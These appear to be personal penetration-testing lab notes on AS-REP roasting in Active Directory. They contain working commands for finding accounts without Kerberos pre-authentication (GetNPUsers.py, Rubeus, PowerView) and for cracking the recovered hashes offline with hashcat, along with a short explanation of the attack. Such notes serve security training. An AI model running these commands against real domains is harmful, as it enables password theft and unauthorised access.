# Cheatsheet

`find all users where donotrequirepreauth enabled  and perform asreproast`
```
GetNPUsers.py blackwood.local/username -dc-ip 172.16.5.5 -password <password>
```
2. another method that takes 2 steps
`slower method(requires a users file)`
```shell-session
GetNPUsers.py blackwood.local/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
- `-no-pass`: Do not supply credentials; attempt AS-REP Roasting.
- `-usersfile`: Provide a list of usernames to test for this vulnerability.
```powershell-session
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```


`crack asrep`
```shell-session
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```
`Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser`
```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. 
The Domain Controller will decrypt this to validate that the correct password was used.

If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.

This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
![](Screenshots/Pasted%20image%2020241224174240.png)
If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser


```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```